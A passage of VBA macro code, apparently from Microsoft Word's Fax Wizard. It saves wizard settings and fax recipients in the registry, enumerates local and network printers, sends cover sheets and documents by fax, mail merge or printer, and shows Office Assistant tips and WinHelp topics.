    formWizard.txtSenderFax.Text = StrRestorePref("Sender Fax", "")
    formWizard.txtSenderPhone.Text = StrRestorePref("Sender Phone", "")
    
    'Panel 4
    iFaxStyle = IRestorePref("Coversheet Style", 0)
    If (iFaxStyle < iSTY_PROFESSIONAL) Or (iFaxStyle > iSTY_ELEGANT) Then _
        iFaxStyle = iSTY_PROFESSIONAL
    Select Case iFaxStyle
        Case iSTY_PROFESSIONAL
            formWizard.optStyleProf.Value = True
            formWizard.lblStyle0.Visible = True
        Case iSTY_CONTEMPORARY
            formWizard.optStyleCont.Value = True
            formWizard.lblStyle1.Visible = True
        Case iSTY_ELEGANT
            formWizard.optStyleEleg.Value = True
            formWizard.lblStyle2.Visible = True
    End Select
    
    On Error GoTo -1 'reset error trap
    On Error Resume Next
    formWizard.txtCompany.Text = System.PrivateProfileString("", strREGKEY_CMPNY_NAME, strVALKEY_CMPNY_NAME)
    fSettingsRestored = True
    System.Cursor = wdCursorNormal
    StatusBar = ""
    Application.ScreenUpdating = True

    Exit Sub
    
FatalError:
    ReportError Err
End Sub

'sets default merge fields
Public Sub FillMergeFields(fDummy As Boolean)
Dim i As Integer, iCount As Integer
Dim iFirstName As Integer
Dim iLastName As Integer
Dim iFax As Integer
Dim rgstrNames() As String
Dim objFieldNames As MailMergeFieldNames
Dim objTempDoc As Document

    On Error GoTo FatalError
    iFirstName = -1
    iLastName = -1
    iFax = -1
    
    'reset the query options so that all names in the data src are selected
    
    Set objFieldNames = objDataSrc.FieldNames
    iCount = objFieldNames.Count
    ReDim rgstrNames(iCount - 1)
    For i = 1 To iCount
        rgstrNames(i - 1) = objFieldNames(i).Name
        If InStr(rgstrNames(i - 1), strFLD_NAME) Then
            If iFirstName = -1 Then
                iFirstName = i - 1
            ElseIf iLastName = -1 Then
                iLastName = i - 1
            End If
        ElseIf InStr(rgstrNames(i - 1), strFLD_FAX) Then
            If iFax = -1 Then iFax = i - 1
        End If
        
    Next i
    
    formWizard.cboFldsRcpntFirstName.List = rgstrNames
    formWizard.cboFldsRcpntLastName.List = rgstrNames
    formWizard.cboFldsFaxNum.List = rgstrNames
    
    formWizard.cboFldsRcpntFirstName.AddItem strNONE
    formWizard.cboFldsRcpntLastName.AddItem strNONE
    
    If (iFirstName <> -1) Then
        formWizard.cboFldsRcpntFirstName.Value = rgstrNames(iFirstName)
    Else
        formWizard.cboFldsRcpntFirstName.Value = strNONE
    End If
        
    If (iLastName <> -1) Then
        formWizard.cboFldsRcpntLastName.Value = rgstrNames(iLastName)
    Else
        formWizard.cboFldsRcpntLastName.Value = strNONE
    End If
        
    If (iFax <> -1) Then _
        formWizard.cboFldsFaxNum.Value = rgstrNames(iFax)

    Exit Sub
    
FatalError:
    ReportError Err
End Sub

'retrieves the Names and numbers stored in registry.
Sub ReadRegistryFaxNames(fDummy As Boolean)
Dim j As Integer, k As Integer
Dim objCtrls As Object
    On Error GoTo FatalError
    fRegistryNamesRead = True
    Set objCtrls = formWizard.mpgWizardPage.Pages(iPANEL_RCPNTS).Controls
    
    For j = 1 To iMAX_RCPNTS
        rgstrMRUFaxNames(j - 1) = StrRestorePref(strRCPNT_NAME & j, "")
        rgstrMRUFaxNums(j - 1) = StrRestorePref(strRCPNT_NUMBER & j, "")
    Next j
        
    
    For j = 0 To iMAX_RCPNTS - 1
        objCtrls(strCBO_RCPNT_NAME & j).List = rgstrMRUFaxNames
        objCtrls(strCBO_RCPNT_NUM & j).List = rgstrMRUFaxNums
    Next j
    
    Exit Sub
    
FatalError:
    ReportError Err
End Sub
Sub SaveDialogValues(fDummy As Boolean)
    On Error GoTo FatalError
    
    StatusBar = strSAVE_SETTINGS
    Application.ScreenUpdating = False
    System.Cursor = wdCursorWait
    
    System.PrivateProfileString("", strREG_SETTINGS_BASE_KEY, strREG_ASSISTANT_TIME_STAMP) = Format$(Now, "General Date")
    StoreValPref strREG_ASSISTANT_HELP, iLocalState
    
    StorePref "Fax Option", CStr(iFaxOption)
    If iFaxOption = iDIFF_FAX Then _
        StorePref "Fax Driver", formWizard.cboFaxDriver.Text
    
    StorePref "Sender Fax", formWizard.txtSenderFax.Text
    StorePref "Sender Phone", formWizard.txtSenderPhone.Text
    StorePref "Coversheet Style", CStr(iFaxStyle)
    
    If Not (fDocIsFormLtr) Then SaveRcpntsInRegistry
    
    fSettingsSaved = True
    System.Cursor = wdCursorNormal
    StatusBar = ""
    Application.ScreenUpdating = True

    Exit Sub
    
FatalError:
    ReportError Err
End Sub

'stores the recipient names and numbers of iMAX_RCPNTS recipients.
'The name is tagged to the number. So, you can have a number without a name
'but not a name without a number
Private Sub SaveRcpntsInRegistry()
'Dim strName As String
Dim strNum As String
Dim i As Integer, j As Integer, k As Integer
Dim objCtrls As Object

    On Error GoTo FatalError
    k = 0
    'initialize the arrays so that even if the user has not
    'chosen any recipient we can still use the first entry of the arrays.
    rgstrRcpntFaxNames(0) = ""
    rgstrRcpntFaxNums(0) = ""
    iNumRcpnts = 0
    
    Set objCtrls = formWizard.mpgWizardPage.Pages(iPANEL_RCPNTS).Controls
    
    For i = 0 To iMAX_RCPNTS - 1
        strNum = StrSearchReplace(objCtrls(strCBO_RCPNT_NUM & i).Text, vbTab, " ") 'recipient number
        If (Len(strNum)) Then 'if number not empty
            rgstrRcpntFaxNums(k) = strNum 'store number
            rgstrRcpntFaxNames(k) = StrSearchReplace(objCtrls(strCBO_RCPNT_NAME & i).Text, vbTab, " ") 'and corresponding name
            k = k + 1
            StorePref strRCPNT_NUMBER & k, strNum 'store number
            StorePref strRCPNT_NAME & k, rgstrRcpntFaxNames(k - 1)
 
            j = objCtrls(strCBO_RCPNT_NUM & i).ListIndex
            
            'user selected one of the choices
            If j <> -1 Then rgstrMRUFaxNums(j) = ""  'already picked up this text
        End If
    Next i
    
    iNumRcpnts = k
    
    j = 0
    While (k < iMAX_RCPNTS) 'if we haven't yet iMAX_RCPNTS names
        'go through the array of orginally obtained recipients and
        'store which haven't yet been stored
        While ((j < iMAX_RCPNTS) And (Len(rgstrMRUFaxNums(j)) = 0))
            j = j + 1
        Wend
        
        If j = iMAX_RCPNTS Then
            GoTo LReturn 'no names left to fill
        Else
            k = k + 1
            StorePref strRCPNT_NAME & k, rgstrMRUFaxNames(j) 'store name
            StorePref strRCPNT_NUMBER & k, rgstrMRUFaxNums(j) 'and corresponding number
            rgstrMRUFaxNums(j) = ""
        End If
    Wend

LReturn:
    Exit Sub
FatalError:
    ReportError Err
End Sub

'Error will be taken care of in SetupDocForFax
'Cover sheet is deleted after faxing if no cover sheet is opted by user. So,
'Activedocument is new cover sheet doc.
Private Sub SaveRcpntsInDocVars(fSaveRcpnts As Boolean)
Dim i As Integer
Dim objVars As Variables
Dim strTemp As String, strFaxFld As String

    Set objVars = ActiveDocument.Variables
    objVars.Add strNUM_RCPNTS, iNumRcpnts
    
    If fSaveRcpnts Then
        If (iNumRcpnts > 0) Then
            For i = 1 To iNumRcpnts
                objVars.Add strRCPNT_NAME & i, rgstrRcpntFaxNames(i - 1)
                objVars.Add strRCPNT_NUMBER & i, rgstrRcpntFaxNums(i - 1)
            Next i
        End If
    End If
    
    If (fNoCovSht) Then
        objVars.Add "Cover Sheet Present", "0"
    Else
        objVars.Add "Cover Sheet Present", "1"
    End If
    
    strFaxFld = " "
    'store what fax option user chose.
    If (iFaxOption = iDIFF_FAX) Then
        objVars.Add "MS Fax Present", "0"
        objVars.Add "Fax Printer", formWizard.cboFaxDriver.Text
    Else
        objVars.Add "MS Fax Present", "1"
        If fDocIsFormLtr Then
            strFaxFld = formWizard.cboFldsFaxNum.Value
        Else
            strFaxFld = strFLD_FAX_NUMBER
        End If
    End If
    
    objVars.Add "Fax Field Name", strFaxFld

    'if doc. is present and is to be faxed then store relevant info. about doc.
    If (fDocPresent And (Not (formWizard.optCovSht.Value))) Then
        objVars.Add "Main Doc Present", "1"
        objVars.Add "Main Document Name", objMainDoc.Name
        
        'is the field a fax number or an Address Book Entry???
        If (fDocIsFormLtr) Then objVars.Add "Through Email", _
                formWizard.optFldFaxEntry.Value

    Else
        
        objVars.Add "Main Doc Present", "0"
    
    End If
    
End Sub


'removes vbCR & vbLF from the end of the string
'until the last character is not a vbLf or vbCr
Public Function StrRemoveCrLfFromEnd(strText As String) As String
    Dim strChar As String
    Dim i As Integer

    i = Len(strText)
    If (i = 0) Then GoTo LEnd

    strChar = Mid$(strText, i, 1)
    'check for the last character
    While (strChar = vbLf) Or (strChar = vbCr)
        i = i - 1
        strChar = Mid$(strText, i, 1)
    Wend
    
LEnd:
    StrRemoveCrLfFromEnd = Left$(strText, i)
End Function
'counts the number of lines in a string
Public Function ICountLines(ByVal strWhat As String, strNewText As String, iMax As Integer) As Integer
    Dim cLines As Integer, iPos As Integer
    
    strNewText = ""
    cLines = 0
    iPos = InStr(strWhat, vbCr)
    While iPos
        If iPos < Len(strWhat) Then
            If cLines < iMax Then strNewText = strNewText & Left$(strWhat, iPos - 1)
            cLines = cLines + 1
            strWhat = Mid$(strWhat, iPos + 1)
            iPos = InStr(strWhat, vbCr)
        Else
            If cLines < iMax Then strNewText = strNewText & Left$(strWhat, iPos - 1)
            If Len(strWhat) > 1 Then cLines = cLines + 1
            strWhat = ""
            iPos = 0
        End If
    Wend
    If strWhat <> "" Then
        If cLines < iMax Then strNewText = strNewText & strWhat
        cLines = cLines + 1
    End If
    
    ICountLines = cLines

End Function  ' CountLines

'inserts a field of type iFldType at the given range with strText as the text. Field replaces the text in objRng
'so pass a collapsed range always.and updates the range to be at the end
'of the inserted field.
Private Sub InsertField(objRng As Range, iFldType, strText As String, fPreserveFormatting)
    Dim objFld As Field
    
    On Error GoTo FatalError

    Set objFld = objRng.Fields.Add(objRng, iFldType, strText, fPreserveFormatting)
    
    Set objRng = objFld.result
    With objRng
        .Collapse wdCollapseEnd
        .End = .End + 1
        .Start = .End
    End With
    
    Exit Sub
FatalError:
    ReportError Err
    
End Sub
'replaces all occurences of vbCR & vbLF with the delimiter string in strText
'returns the new string
Private Function StrReplaceCrLfWithText(strText As String, strDelim As String) As String
    Dim strRet As String, strTmp As String
    
    strRet = ""
    strTmp = strText
    If Len(strTmp) = 0 Then GoTo LEnd
    
    strRet = StrRemoveCrLfFromEnd(strTmp)
    'remove vbLf thro' search and replace
    strTmp = StrSearchReplace(strRet, vbLf, "")
    'now replace all occurrences of vbCr with strDelim
    strRet = StrSearchReplace(strTmp, vbCr, strDelim)
LEnd:
    StrReplaceCrLfWithText = strRet

End Function

'removes the character strSrch from strText.
'caller should make sure that strSrch is a one character string
'returns the string stripped off the character
Private Function StrSearchReplace(strText As String, strSrch As String, strReplace As String)
    Dim strRet As String, strTmp As String
    Dim iPos As Integer
    
    strRet = ""
    strTmp = strText

    iPos = InStr(strTmp, strSrch)
    
    While (iPos) 'presence of strChar
        strRet = strRet & Left$(strTmp, iPos - 1)
        If (iPos < Len(strTmp)) Then
            strRet = strRet & strReplace
            strTmp = Mid$(strTmp, iPos + 1)
            iPos = InStr(strTmp, strSrch)
        Else 'strSrch is the last character
            strTmp = ""
            iPos = 0
        End If
    Wend
        
    'append whatever is left of the original string
    strRet = strRet & strTmp

    StrSearchReplace = strRet
End Function

'Errors in SaveRcpntsInDocVars & CreateCmdBar gets propagated back
'this function
Public Sub SetupDocForFax(fDummy As Boolean)
    On Error GoTo FatalError

    If iFaxOption = iNO_FAX Then Exit Sub

    If (Not (fDocIsFormLtr)) And (iNumRcpnts = 0) And (iFaxOption = iMS_FAX) _
            Then Exit Sub
        
    'dont save recipient info for form letter
    SaveRcpntsInDocVars (Not (fDocIsFormLtr))
    
    If (fNoCovSht) Then 'fax the doc.
        If (Not (fDocIsFormLtr)) Then
            FaxRegDoc
        Else
            FaxFormLtr
        End If
    Else
        CreateCmdBar
    End If

    Exit Sub
FatalError:
    DisplayErrorMsg strERR_CREATING_CMDBAR
    ReportError Err
End Sub
'Error will be taken care of in SetupDocForFax
Private Sub CreateCmdBar()
Dim objCmdBar As CommandBar
Dim objBtn As CommandBarButton

    Application.CustomizationContext = ActiveDocument
    Set objCmdBar = Application.CommandBars.Add(strCMD_BAR_TITLE, Position:=msoBarFloating, Temporary:=True)

    'Add a button
    Set objBtn = objCmdBar.Controls.Add(msoControlButton, Temporary:=True)
    objBtn.Style = msoButtonCaption
    objBtn.Caption = strCMD_BTN_TEXT
    
    If (Not (fDocIsFormLtr)) Then
        objBtn.OnAction = "Fax.FaxRegDoc"
    Else
        objBtn.OnAction = "Fax.FaxFormLtr"
    End If
    
    objCmdBar.Visible = True
    
    fCreatedCmdBar = True
    Exit Sub

End Sub

'Cover sheet is deleted after faxing if no cover sheet is opted by user. So,
'Activedocument is new cover sheet doc.
Private Sub FaxRegDoc()

Dim fMSFax As Boolean
Dim fCovSht As Boolean
Dim iNumRcpnts As Integer
Dim rgstrFaxNames(iMAX_RCPNTS) As String
Dim rgstrFaxNums(iMAX_RCPNTS) As String
Dim i As Integer
Dim strDocName As String
Dim objVars As Variables
Dim fMainDocPresent As Integer
Dim strErrorMsg As String
Dim strFaxPrinter As String, strActivePrinter As String
Dim objTmpMM As MailMerge, strFaxFld As String
Dim fSendMailAttach As Boolean


    On Error GoTo FatalError
    strErrorMsg = strERR_SEND_FAX
    fSendMailAttach = Application.Options.SendMailAttach
    
    Set objVars = ActiveDocument.Variables
    
    iNumRcpnts = Val(objVars(strNUM_RCPNTS).Value)
    
    fCovSht = Val(objVars("Cover Sheet Present").Value)
    fMSFax = Val(objVars("MS Fax Present").Value)
    fMainDocPresent = Val(objVars("Main Doc Present").Value)
    strFaxFld = objVars("Fax Field Name").Value
    
    If fMainDocPresent Then
        'obtain handle to main document
        strDocName = objVars("Main Document Name").Value
        If FInvalidMainDoc(objMainDoc, strDocName) Then Exit Sub
        'Set objMainDoc = Application.Documents(strDocName)
    End If
          
    For i = 1 To iNumRcpnts
        rgstrFaxNames(i - 1) = objVars(strRCPNT_NAME & i).Value
        rgstrFaxNums(i - 1) = objVars(strRCPNT_NUMBER & i).Value
    Next i
    
    'if nonMSFax, then set the Fax driver to be the current printer
    If (Not (fMSFax)) Then
        strActivePrinter = Application.ActivePrinter
        strFaxPrinter = objVars("Fax Printer").Value
        If Len(strFaxPrinter) = 0 Then strFaxPrinter = " "
        Application.ActivePrinter = strFaxPrinter
     End If
    
    'fax the cover sheet first
    If (fCovSht) Then
        If (iNumRcpnts > 1) Then
            Set objTmpMM = ActiveDocument.MailMerge
            If fMSFax Then
                objTmpMM.Destination = wdSendToFax
                'MsgBox "MailMerging the cover sheet"
            Else 'non MS fax
                objTmpMM.Destination = wdSendToPrinter
            End If
            objTmpMM.MailAsAttachment = True
            objTmpMM.MailAddressFieldName = strFaxFld
            StatusBar = strFAXING_CS_RECIPIENTS
            objTmpMM.Execute
            
        ElseIf (iNumRcpnts = 1) And fMSFax Then
            StatusBar = strFAXING_CS_TO & " " & rgstrFaxNums(0) & "..."
            Application.Options.SendMailAttach = True
            ActiveDocument.SendFax rgstrFaxNums(0)
                'MsgBox "Faxing to  " & rgstrFaxNames(0) & rgstrFaxNums(0)
        Else 'non MS fax
            StatusBar = strFAXING_CS_RECIPIENT & "..."
            ActiveDocument.PrintOut
        End If
    End If
    
    If fMainDocPresent = 0 Then GoTo LResetPrinter 'if no main doc. then deesh
    
    If (iNumRcpnts = 0) And Not (fMSFax) Then objMainDoc.PrintOut
    
    'send the main doc.
    If fMSFax Then Application.Options.SendMailAttach = True
    For i = 0 To iNumRcpnts - 1
        If fMSFax Then
            StatusBar = strFAXING_DOC_TO & " " & rgstrFaxNums(i)
            objMainDoc.SendFax rgstrFaxNums(i)
            'MsgBox "Faxing to  " & rgstrFaxNames(i) & rgstrFaxNums(i)
        Else
            StatusBar = strFAXING_DOC_RECIPIENT & " " & CStr(i + 1) & "..."
            objMainDoc.PrintOut
        End If
        
    Next i
    
LResetPrinter:
'reset printer for non MS fax
    If fMSFax Then
        Application.Options.SendMailAttach = fSendMailAttach
    Else
        Application.ActivePrinter = strActivePrinter
    End If
    DisplayPostWizTip strMSG_FAX_SUCCESS, True
    'DeleteCmdBar strCMD_BAR_TITLE
    Exit Sub
    
FatalError:
    i = Err.Number
    If i Then strErrorMsg = strErrorMsg & vbCr & Err.Description
    'if Fax not installed error message
    If i = iERR_FAX_NOT_INSTALLED Then _
        strErrorMsg = strErrorMsg & vbCr & strHLP_FAX_INSTALL
    DisplayTip strErrorMsg
'reset printer for non MS fax
    If fMSFax Then
        Application.Options.SendMailAttach = fSendMailAttach
    Else
        Application.ActivePrinter = strActivePrinter
    End If
    
    If i = iERR_FAX_NOT_INSTALLED Then
        DisplayHelp strWIN_HELP_FILE, lCNTXT_FAX_INSTALL
    ElseIf i = iERR_FAX_NOT_SENT And fMSFax Then
        DisplayHelp strFAX_HELP_FILE, lCNTXT_FAX_SEND
    End If
End Sub
'Cover sheet is deleted after faxing if no cover sheet is opted by user. So,
'Activedocument is new cover sheet doc.
Private Sub FaxFormLtr()

Dim fMSFax As Boolean
Dim fCovSht As Boolean
Dim i As Integer
Dim strDocName As String
Dim iDestination As Long
Dim objVars As Variables
Dim fMainDocPresent As Integer
Dim strErrorMsg As String
Dim strFaxPrinter As String, strActivePrinter As String
Dim objTmpMM As MailMerge, strFaxFld As String

    On Error GoTo FatalError

    strErrorMsg = strERR_SEND_FAX
    Set objVars = ActiveDocument.Variables

    fCovSht = Val(objVars("Cover Sheet Present").Value)
    fMSFax = Val(objVars("MS Fax Present").Value)
    fMainDocPresent = Val(objVars("Main Doc Present").Value)
    strFaxFld = objVars("Fax Field Name").Value
    
    If fMainDocPresent Then
        'obtain handle to main document
        strDocName = objVars("Main Document Name").Value
        If FInvalidMainDoc(objMainDoc, strDocName) Then Exit Sub
        'Set objMainDoc = Application.Documents(strDocName)
    End If
    
    If fMSFax Then
        If Val(objVars("Through Email").Value) Then
            iDestination = wdSendToEmail
        Else
            iDestination = wdSendToFax
        End If
    Else
        iDestination = wdSendToPrinter
        'if nonMSFax, then set the Fax driver to be the current printer
        strActivePrinter = Application.ActivePrinter
        strFaxPrinter = objVars("Fax Printer").Value
        If Len(strFaxPrinter) = 0 Then strFaxPrinter = " "
        Application.ActivePrinter = strFaxPrinter
    End If
    
    'send the coversheet first
    If (fCovSht) Then
        Set objTmpMM = ActiveDocument.MailMerge
        objTmpMM.Destination = iDestination 'MsgBox "MailMerging activdoc (coversheet) "
        objTmpMM.MailAddressFieldName = strFaxFld
        objTmpMM.MailAsAttachment = True
        StatusBar = strFAXING_CS_RECIPIENTS
        objTmpMM.Execute
    End If
 
    If fMainDocPresent = 0 Then GoTo LResetPrinter
    
    'fax the main document
    Set objTmpMM = objMainDoc.MailMerge
    objTmpMM.Destination = iDestination
    objTmpMM.MailAddressFieldName = strFaxFld
    objTmpMM.MailAsAttachment = True
    StatusBar = strFAXING_DOC_RECIPIENTS
    objTmpMM.Execute
    'MsgBox "MailMerging main doc."

LResetPrinter:
'reset printer for non MS fax
    ActiveDocument.Fields.Update
    If (Not (fMSFax)) Then Application.ActivePrinter = strActivePrinter
    DisplayPostWizTip strMSG_FAX_SUCCESS, True
    'DeleteCmdBar strCMD_BAR_TITLE
    Exit Sub
    
FatalError:
    i = Err.Number
    If i Then strErrorMsg = strErrorMsg & vbCr & Err.Description
    'if Fax not installed error message
    If i = iERR_FAX_NOT_INSTALLED Then _
        strErrorMsg = strErrorMsg & vbCr & strHLP_FAX_INSTALL
        
    DisplayTip strErrorMsg
    
'reset printer for non MS fax
    If (Not (fMSFax)) Then Application.ActivePrinter = strActivePrinter
    
    If i = iERR_FAX_NOT_INSTALLED Then
        DisplayHelp strWIN_HELP_FILE, lCNTXT_FAX_INSTALL
    ElseIf i = iERR_FAX_NOT_SENT And fMSFax Then
        DisplayHelp strFAX_HELP_FILE, lCNTXT_FAX_SEND
    End If
End Sub

'To display help using help files. Assuming that the help files are present in
'the windows directory
Private Sub DisplayHelp(strFile As String, ByVal lContext As Long)
    Dim iSize As Integer
    Dim strTmpBuffer As String
    Dim j As Integer, i As Integer
    Dim strWinDir As String, strWndName As String
    Dim hOpusWin As Long, lResult As Long
    Dim strMacroName As String
    
    'Get windows directory
    i = 512
    strTmpBuffer = String$(i, 0)
    j = 0
    strWinDir = ""
    j = GetWindowsDirectory(strTmpBuffer, i)
    
    If j Then
        If (j > i) Then j = i
        
        strWinDir = Left$(strTmpBuffer, j)
        If Right$(strWinDir, 1) <> strPathSeparator Then _
            strWinDir = strWinDir & strPathSeparator
    End If
    
    'Find word's window
    strWndName = strMS_WORD
    If ActiveWindow.WindowState = wdWindowStateMaximize Then _
        strWndName = strWndName & " - " & ActiveWindow.Caption
    hOpusWin = FindWindow("OpusApp", strWndName)
    If hOpusWin = 0 Then GoTo LNotFindWindow
    
    'display help
    strMacroName = "JH(" & strQUOTE & strQUOTE & " , " & lContext & ")"
    lResult = WinHelp(hOpusWin, strWinDir & strFile, HELP_COMMAND, strMacroName)
    
LNotFindWindow:
End Sub
'displays a tip during post-wizard options
'assumes that Assistant is present since it is called from post-wizard balloon
Private Sub DisplayTip(strTip As String)
    Dim objBlnTip As Balloon
    On Error GoTo FatalError
    
    Set objBlnTip = Assistant.NewBalloon
    
    With objBlnTip
        .Mode = msoModeModal
        .Heading = strWizName
        .Text = strTip
        .button = msoButtonSetOK
    End With
    objBlnTip.Show
    
    If Assistant.BalloonError <> msoBalloonErrorNone Then GoTo FatalError

    Exit Sub

FatalError:
    Err.Clear
    'MsgBox strTip, vbOKOnly + vbApplicationModal, strWizName
End Sub
'ROUTINES TO OBTAIN PRINTERS FROM REGISTRY
'fills rgstrPrinterNames with the local and remote printer names obtained
'from the registry. iTotalNumPrinters has the number of printer
'names obtained.
Sub GetAllPrinters()
Dim i As Integer

    iTotalNumPrinters = 0
    
    GetLocalPrinters
    GetRemotePrinters
    
    If (iTotalNumPrinters > 0) Then
        ReDim Preserve rgstrPrinterNames(iTotalNumPrinters - 1)
        formWizard.cboFaxDriver.List = rgstrPrinterNames
        formWizard.cboFaxDriver.ListIndex = 0
    End If
    'if no printers, then the user can use cmdOtherPrinters to select one
    'if we failed to enumerate some printer
    
End Sub
Sub GetRemotePrinters()
    Dim hr As Long
    Dim hSubKey As Long

    hr = RegOpenKey(HKEY_LOCAL_MACHINE, strREG_PROVIDERS, hSubKey)
    If hr <> ERROR_SUCCESS Then Exit Sub
    
    GetRemotePrinterNames (hSubKey)

    RegCloseKey (hSubKey)
    
End Sub

Sub GetProviderPrinters(strProvider As String)
Dim hr As Long
Dim hKeyProviderServers As Long
Dim lpPrinterServer As String, strPrinterServer As String
Dim cbPrinterServer As Long
Dim dwPrinterIndex As Long
Dim lRet As Long, iLenPrinterServer As Integer

    cbPrinterServer = 256
    lpPrinterServer = String$(cbPrinterServer, 0)
    dwPrinterIndex = 0


    hr = RegOpenKey(HKEY_LOCAL_MACHINE, strREG_PROVIDERS & strProvider & "\Servers", hKeyProviderServers)

    If hr <> ERROR_SUCCESS Then GoTo LEndGetProviderPrinters
            
    lRet = ERROR_SUCCESS
    While (lRet = ERROR_SUCCESS)
        lpPrinterServer = String$(cbPrinterServer, 0)
        
        hr = RegEnumKey(hKeyProviderServers, dwPrinterIndex, lpPrinterServer, cbPrinterServer)
        
        If hr <> ERROR_SUCCESS Then GoTo LCloseProviderServersKey
        
        iLenPrinterServer = InStr(lpPrinterServer, Chr$(0))
        If (iLenPrinterServer > 1) Then 'no name
            strPrinterServer = Left$(lpPrinterServer, iLenPrinterServer - 1)
            GetPrinterNamesFromServer strProvider, strPrinterServer
        End If

        dwPrinterIndex = dwPrinterIndex + 1
    Wend
        
LCloseProviderServersKey:
    RegCloseKey (hKeyProviderServers)
    
LEndGetProviderPrinters:
End Sub

Sub GetPrinterNamesFromServer(strProvider As String, strPrinterServer As String)
Dim hr As Long
Dim hKeyPrinterServers As Long
Dim lpPrinterName As String, strPrinterName As String
Dim strPrinter As String
Dim cbPrinterName As Long
Dim dwPrinterIndex As Long
Dim lRet As Long, iLenPrinterName As Integer
Dim strRegPrinterServers As String


    cbPrinterName = 256
    lpPrinterName = String$(cbPrinterName, 0)
    dwPrinterIndex = 0

    On Error Resume Next
    strRegPrinterServers = strREG_PROVIDERS & strProvider & "\Servers\" & strPrinterServer & "\Printers"
    hr = RegOpenKey(HKEY_LOCAL_MACHINE, strRegPrinterServers, hKeyPrinterServers)

    If hr <> ERROR_SUCCESS Then GoTo LEndGetProviderPrinters
            
    lRet = ERROR_SUCCESS
    While (lRet = ERROR_SUCCESS)
        lpPrinterName = String$(cbPrinterName, 0)
        
        lRet = RegEnumKey(hKeyPrinterServers, dwPrinterIndex, lpPrinterName, cbPrinterName)
        
        If lRet <> ERROR_SUCCESS Then GoTo LClosePrinterServersKey
        
        iLenPrinterName = InStr(lpPrinterName, Chr$(0))
        If (iLenPrinterName > 1) Then 'no name
            strPrinter = Left$(lpPrinterName, iLenPrinterName - 1)
            strPrinterName = ""
            strPrinterName = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\" & strRegPrinterServers & "\" & strPrinter, "Name")
            
            If Len(strPrinterName) <> 0 Then
                If (iTotalNumPrinters Mod 10) = 0 Then _
                    ReDim Preserve rgstrPrinterNames(iTotalNumPrinters + 10)
                rgstrPrinterNames(iTotalNumPrinters) = UCase$("\\" & strPrinterServer & "\" & strPrinterName)
                iTotalNumPrinters = iTotalNumPrinters + 1
            End If
        End If

        dwPrinterIndex = dwPrinterIndex + 1
    Wend
        
LClosePrinterServersKey:
    RegCloseKey (hKeyPrinterServers)
    
LEndGetProviderPrinters:

End Sub

Sub GetRemotePrinterNames(hKey As Long)
    Dim dwProviderIndex As Long
    Dim cbProviderName As Long
    Dim lpProviderName As String
    Dim lRet As Long, iLenProviderName  As Integer

    Dim strProviderName As String
  
    cbProviderName = 256
    dwProviderIndex = 0

    lRet = ERROR_SUCCESS
    
    'get the list of providers and call GetProviderPrinters for each provider
    While (lRet = ERROR_SUCCESS)
        lpProviderName = String$(cbProviderName, 0)
        
        lRet = RegEnumKey(hKey, dwProviderIndex, lpProviderName, cbProviderName)
        
        If (lRet <> ERROR_SUCCESS) Then GoTo LEnd
        
        iLenProviderName = InStr(lpProviderName, Chr$(0)) 'length of provider name
        
        If (iLenProviderName > 1) Then
            strProviderName = Left$(lpProviderName, iLenProviderName - 1)
            GetProviderPrinters (strProviderName)
        End If

        dwProviderIndex = dwProviderIndex + 1
    Wend
    
LEnd:

End Sub

Sub GetLocalPrinters()
    Dim hr As Long
    Dim hSubKey As Long

    hr = RegOpenKey(HKEY_LOCAL_MACHINE, strREG_LOCAL_PRINTERS, hSubKey)
    If hr <> ERROR_SUCCESS Then Exit Sub

    GetLocalPrinterNames (hSubKey)

    RegCloseKey (hSubKey)
    
End Sub

Sub GetLocalPrinterNames(hKey As Long)

Dim lpPrinterName As String, strPrinterName As String
Dim strPrinter As String
Dim cbPrinterName As Long
Dim dwPrinterIndex As Long
Dim lRet As Long, iLenPrinterName As Integer

    cbPrinterName = 256
    dwPrinterIndex = 0

    On Error Resume Next
    
    lRet = ERROR_SUCCESS
    While (lRet = ERROR_SUCCESS)
        lpPrinterName = String$(cbPrinterName, 0)
        
        lRet = RegEnumKey(hKey, dwPrinterIndex, lpPrinterName, cbPrinterName)
        
        If lRet <> ERROR_SUCCESS Then GoTo LEndLocalPrinters
        
        iLenPrinterName = InStr(lpPrinterName, Chr$(0))
        If (iLenPrinterName > 1) Then 'no name
            strPrinter = Left$(lpPrinterName, iLenPrinterName - 1)
            strPrinterName = ""
            strPrinterName = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\" & strREG_LOCAL_PRINTERS & strPrinter, "Name")
            
            If Len(strPrinterName) <> 0 Then 'if valid name, add to list
                If (iTotalNumPrinters Mod 10) = 0 Then _
                    ReDim Preserve rgstrPrinterNames(iTotalNumPrinters + 10)
                
                rgstrPrinterNames(iTotalNumPrinters) = UCase$(strPrinterName)
                
                iTotalNumPrinters = iTotalNumPrinters + 1
            End If
        End If

        dwPrinterIndex = dwPrinterIndex + 1
    Wend
        
    
LEndLocalPrinters:
End Sub

'displays post wizard tip in an autodown balloon if Assistant is visible
Public Sub DisplayPostWizTip(strTip As String, fMsgBox As Boolean)

    Dim objTipBalloon As Balloon

    On Error GoTo TipError
    If fMsgBox Then
        If Assistant.Visible = False Then GoTo TipError
    End If
    Set objTipBalloon = Assistant.NewBalloon
    With objTipBalloon
        .Mode = msoModeAutoDown
        .Heading = strWizName
        .button = msoButtonSetNone
        .Text = strTip
    End With
    objTipBalloon.Show

    If Assistant.BalloonError <> msoBalloonErrorNone Then GoTo TipError
    
TipError:
    Err.Clear
    If fMsgBox Then MsgBox strTip, vbInformation + vbOKOnly + vbApplicationModal, strWizName
End Sub

Private Function FInvalidMainDoc(objMainDoc As Document, strDocName As String) As Boolean
    On Error GoTo NoDoc
    Set objMainDoc = Application.Documents(strDocName)
    FInvalidMainDoc = False
    Exit Function
NoDoc:
    DisplayErrorMsg strERR_NO_MAIN_DOC1 & strDocName & strERR_NO_MAIN_DOC2
    FInvalidMainDoc = True
End Function

Public Sub DeleteCmdBar(strCmdBarName)
    On Error Resume Next
    Application.CommandBars(strCmdBarName).Delete
    Err.Clear
End Sub


Function GetCurFont(rgn As Range) As Font
    On Error GoTo LError
    If (rgn.Font.Size = 9999999) Then
        If (rgn.Characters(1).Font.Size = 9999999) Then
            Set GetCurFont = ActiveDocument.Styles(rgn.Paragraphs(1).Style).Font
        Else
            Set GetCurFont = rgn.Characters(1).Font
        End If
    Else
        Set GetCurFont = rgn.Font
    End If
    Exit Function
LError:
    MsgBox Err.Description
End Function

'returns the value stored in registry key strId
Public Function StrFetchPref(strId As String) As String
    On Error GoTo LReturnNull
    
